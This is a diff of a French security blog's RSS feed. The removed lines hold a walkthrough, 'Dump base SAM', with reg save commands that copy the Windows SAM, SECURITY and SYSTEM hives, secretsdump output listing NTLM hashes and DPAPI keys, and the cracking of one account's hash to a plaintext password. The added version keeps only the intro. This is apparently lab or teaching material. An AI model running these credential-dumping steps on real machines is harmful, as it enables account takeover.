@@ -1,122 +1,20 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>Registre on KIRÔN</title>
-        <link>http://localhost:1313/tags/registre/</link>
-        <description>Recent content in Registre on KIRÔN</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>fr</language>
-        <copyright>Enzo Ribeiro</copyright>
-        <lastBuildDate>Thu, 05 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/registre/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>Dump base SAM</title>
-        <link>http://localhost:1313/p/dump-base-sam/</link>
-        <pubDate>Thu, 05 Mar 2026 00:00:00 +0000</pubDate>
-        
-        <guid>http://localhost:1313/p/dump-base-sam/</guid>
-        <description>&lt;h2 id=&#34;intro&#34;&gt;Intro
-&lt;/h2&gt;&lt;p&gt;La &lt;strong&gt;base SAM&lt;/strong&gt; (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous &lt;code&gt;HKEY_LOCAL_MACHINE\SAM&lt;/code&gt;, qui gère les comptes utilisateurs locaux, groupes et &lt;strong&gt;hashs NTLM&lt;/strong&gt; des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus &lt;strong&gt;LSASS&lt;/strong&gt; (&lt;code&gt;lsass.exe&lt;/code&gt;) pour authentifier les sessions locales.&lt;/p&gt;
-&lt;p&gt;Malgré son rôle critique, sa &lt;strong&gt;sécurité est faible&lt;/strong&gt; : accessible uniquement en privilèges &lt;strong&gt;SYSTEM&lt;/strong&gt; ou admin, elle s&amp;rsquo;extrait facilement via &lt;code&gt;reg save hklm\sam&lt;/code&gt; après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.&lt;/p&gt;
-&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation
-&lt;/h2&gt;&lt;p&gt;Après une élévation de privilège (pas forcément nécessaire si le compte que nous avons dipose des droits : &lt;code&gt;SeBackupPrivilege&lt;/code&gt;) nous pouvons exécuté les commandes suivantes :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg save HKLM\SAM &amp;#34;C:\Windows\Temp\sam.save&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg save HKLM\SECURITY &amp;#34;C:\Windows\Temp\security.save&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg save HKLM\SYSTEM &amp;#34;C:\Windows\Temp\system.save&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Une fois extraite nous pouvons nous rendre dans le dossier Temp pour vérifier que les registre y sont bien :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Windows\Temp&amp;gt; dir
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Répertoire : C:\Windows\Temp
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Mode                 LastWriteTime         Length Name
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----                 -------------         ------ ----
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a----        05/03/2026     14:40          53248 sam.save
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a----        05/03/2026     14:40          32768 security.save
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a----        05/03/2026     14:40       11071488 system.save
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Nous pouvons donc maintenant les transférer les &amp;ldquo;BackUp&amp;rdquo; vers notre machine, de mon côté j&amp;rsquo;utilise &lt;code&gt;temp.sh&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Une fois dans notre machine (exegol pour moi), il faut rentrer cette commande :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;secretsdump -sam sam.save -system system.save -security security.save LOCAL
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Target system bootKey: 0xf506f5839ff1b3bca4cb9085cc49bd63
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; SAM hashes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uid:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8aac1c783ea7d4cd131375a0be698448:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kiron:1001:aad3b435b51404eeaad3b435b51404ee:ac67fa8a30aa36b5a06b5fb8ce4c01f1:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root:1002:aad3b435b51404eeaad3b435b51404ee:93dde96f43d7462ef36fbea2e64265af:::
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping cached domain logon information &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain/username:hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping LSA Secrets
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DPAPI_SYSTEM
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpapi_machinekey:0x77b195bed94b8ad49b5ac0a3a596caa05fd1a3e9
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpapi_userkey:0x68170a5d34618129a51bf5514b82a29923487300
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NL&lt;span class=&#34;nv&#34;&gt;$KM&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt;   E9 &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; D4 &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; 7D A3 &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;  AF E9 &lt;span class=&#34;m&#34;&gt;75&lt;/span&gt; AB F8 AC BD 6C   .Q.7.&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.U..u....l
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;0010&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; D0 2A EE &lt;span class=&#34;m&#34;&gt;86&lt;/span&gt; 0E C4 EB  &lt;span class=&#34;m&#34;&gt;92&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; F9 &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt; ED FE   ..*......y ..V..
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;0020&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;91&lt;/span&gt; F1 6D &lt;span class=&#34;m&#34;&gt;39&lt;/span&gt; 7C B1 AA  0D &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; C3 FC D0 D3 B0   ...m9&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;...&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;d.....
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;0030&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt; D4 &lt;span class=&#34;m&#34;&gt;78&lt;/span&gt; ED 4C CF &lt;span class=&#34;m&#34;&gt;70&lt;/span&gt; B4  D7 B2 E6 F9 &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt;   V.x.L.p.....@d &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NL&lt;span class=&#34;nv&#34;&gt;$KM&lt;/span&gt;:e951d437007da355afe975abf8acbd6c12d02aee860ec4eb92792008f956edfe0091f16d397cb1aa0d6064c3fcd0d3b056d478ed4ccf70b4d7b2e6f940642033
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Ici l&amp;rsquo;identifiant qui m&amp;rsquo;intéresse c&amp;rsquo;est &lt;code&gt;root&lt;/code&gt;, je peux donc prendre  le Hash NT te le mettre dans &lt;code&gt;CrackStation&lt;/code&gt; :
-![[Pasted image 20260305145659.png]]&lt;/p&gt;
-&lt;p&gt;Nous pouvons voir ici que le mot de passe est &lt;code&gt;diamond1&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Il est également possible de cracké le mot de passe avec hashcat.&lt;/p&gt;
-</description>
-        </item>
-        
-    </channel>
+  <channel>
+    <title>Registre on KIRÔN</title>
+    <link>http://localhost:1313/tags/registre/</link>
+    <description>Recent content in Registre on KIRÔN</description>
+    <generator>Hugo</generator>
+    <language>fr</language>
+    <copyright>Enzo Ribeiro</copyright>
+    <lastBuildDate>Thu, 05 Mar 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/registre/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Dump base SAM</title>
+      <link>http://localhost:1313/p/dump-base-sam/</link>
+      <pubDate>Thu, 05 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/p/dump-base-sam/</guid>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;&#xA;&lt;p&gt;La &lt;strong&gt;base SAM&lt;/strong&gt; (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous &lt;code&gt;HKEY_LOCAL_MACHINE\SAM&lt;/code&gt;, qui gère les comptes utilisateurs locaux, groupes et &lt;strong&gt;hashs NTLM&lt;/strong&gt; des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus &lt;strong&gt;LSASS&lt;/strong&gt; (&lt;code&gt;lsass.exe&lt;/code&gt;) pour authentifier les sessions locales.&lt;/p&gt;&#xA;&lt;p&gt;Malgré son rôle critique, sa &lt;strong&gt;sécurité est faible&lt;/strong&gt; : accessible uniquement en privilèges &lt;strong&gt;SYSTEM&lt;/strong&gt; ou admin, elle s&amp;rsquo;extrait facilement via &lt;code&gt;reg save hklm\sam&lt;/code&gt; après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.&lt;/p&gt;</description>
+    </item>
+  </channel>
 </rss>
